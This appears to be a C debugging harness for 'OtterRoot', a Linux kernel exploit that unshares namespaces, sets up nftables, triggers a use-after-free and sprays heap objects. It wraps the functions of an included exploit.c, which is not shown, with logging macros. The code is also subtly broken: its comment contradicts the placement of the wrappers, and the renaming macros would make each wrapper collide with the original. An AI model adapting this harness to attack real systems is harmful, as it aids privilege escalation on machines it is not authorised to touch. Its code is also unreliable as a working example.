/*
 * exploit_dbg.c – OtterRoot with verbose debugging helpers
 *
 *  This file is mechanically derived from exploit.c.  All exploitation
 *  primitives remain identical, but we sprinkle debug macros around the hot
 *  paths and compile it with AddressSanitizer & frame-pointers to ease
 *  gdb/strace work.  Build via `make` (creates PoC_dbg).
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <time.h>

/* ----------- GLOBAL DEBUG MACROS --------------------------------------- */
#ifdef DEBUG_OTTER
#  define CLR_RED   "\033[1;31m"
#  define CLR_GRN   "\033[1;32m"
#  define CLR_YEL   "\033[1;33m"
#  define CLR_CYN   "\033[1;36m"
#  define CLR_RST   "\033[0m"

#  define DBG(fmt, ...)                                                         \
     fprintf(stderr, CLR_CYN "[DBG] %-24s:%-4d " CLR_RST fmt "\n",            \
             __func__, __LINE__, ##__VA_ARGS__)

#  define CHECK(call, msg)  do {                                               \
        if ((call) < 0)                                                        \
            err(1, "%s", msg);                                               \
    } while (0)

#  define RET_FAIL(msg) errx(1, "%s", msg)
#  define LOUD_SUCCESS(fmt, ...)                                               \
     fprintf(stderr, CLR_GRN "[OK] " fmt CLR_RST "\n", ##__VA_ARGS__)
#  define LOUD_FAIL(fmt, ...)                                                  \
     fprintf(stderr, CLR_RED "[!!] " fmt CLR_RST "\n", ##__VA_ARGS__)
#  define LOUD_WARN(fmt, ...)                                                  \
     fprintf(stderr, CLR_YEL "[??] " fmt CLR_RST "\n", ##__VA_ARGS__)
#  define GUARD_ITER(i, limit, msg)  do { if ((i) >= (limit)) RET_FAIL(msg); } while(0)
#else
#  define DBG(...)     do {} while (0)
#  define CHECK(c, m)  (void)(c)
#  define RET_FAIL(m)  do { (void)(m); } while (0)
#  define LOUD_SUCCESS(...) do{}while(0)
#  define LOUD_FAIL(...) do{}while(0)
#  define LOUD_WARN(...) do{}while(0)
#  define GUARD_ITER(i,l,m) do{}while(0)
#endif

/* Replace every perror() with err() to exit on failure and keep single code
 * path – this must be defined *before* including the original source so it
 * affects all calls there. */
#define perror(msg) err(1, "%s", msg)

/* Pull in the original implementation ------------------------------------- */
/*  We #include the original source so that we can lightly wrap only the most
 *  important functions without having to keep two full copies in sync.  The
 *  wrapper implementations come *before* the include, so the original names
 *  are renamed to _orig and thin wrappers call + log them.
 */

/* Rename the original symbols so we can add wrappers with the public name */
#define unshare_setup        unshare_setup_orig
#define prepare_nftables     prepare_nftables_orig
#define trigger_uaf          trigger_uaf_orig
#define udata_spray          udata_spray_orig
#define deludata_spray       deludata_spray_orig
#define getudata             getudata_orig
#define exploit              exploit_orig

#include "exploit.c"

/* ---------------- WRAPPER IMPLEMENTATIONS ------------------------------- */
static void unshare_setup(uid_t uid, gid_t gid)
{
    DBG("→ unshare_setup(uid=%d, gid=%d)", uid, gid);
    unshare_setup_orig(uid, gid);
    DBG("← unshare_setup() done");
}

static void prepare_nftables(struct mnl_socket *nl)
{
    DBG("→ prepare_nftables() – nl socket=%p", (void *)nl);
    prepare_nftables_orig(nl);
    DBG("← prepare_nftables() done");
}

static void trigger_uaf(struct mnl_socket *nl, size_t size, int *msgqids)
{
    DBG("→ trigger_uaf(size=0x%zx)", size);
    trigger_uaf_orig(nl, size, msgqids);
    DBG("← trigger_uaf() done");
}

static void udata_spray(struct mnl_socket *nl, uint32_t sz, uint32_t start,
                        uint32_t cnt, void *data)
{
    DBG("udata_spray(size=%u start=%u cnt=%u data=%p)", sz, start, cnt, data);
    udata_spray_orig(nl, sz, start, cnt, data);
}

static void deludata_spray(struct mnl_socket *nl, uint32_t start, uint32_t cnt)
{
    DBG("deludata_spray(start=%u cnt=%u)", start, cnt);
    deludata_spray_orig(nl, start, cnt);
}

static char *getudata(struct mnl_socket *nl, char *table_name)
{
    DBG("getudata(table=%s)", table_name);
    char *r = getudata_orig(nl, table_name);
    DBG("getudata() returned buffer @%p (first byte=0x%02x)", r, r ? (unsigned)*r : 0);
    return r;
}

/* The exploit() wrapper is a little noisier because it's the main state
 * machine.  We only add high-level breadcrumbs so the log remains readable.
 */
static int exploit(int argc, char **argv)
{
    DBG("===== exploit() ENTRY =====");
    int ret = exploit_orig(argc, argv);
    DBG("===== exploit() EXIT (ret=%d) =====", ret);
    return ret;
}

/* main() is pulled from exploit.c unchanged – we don't need an extra wrapper */

/* End of file */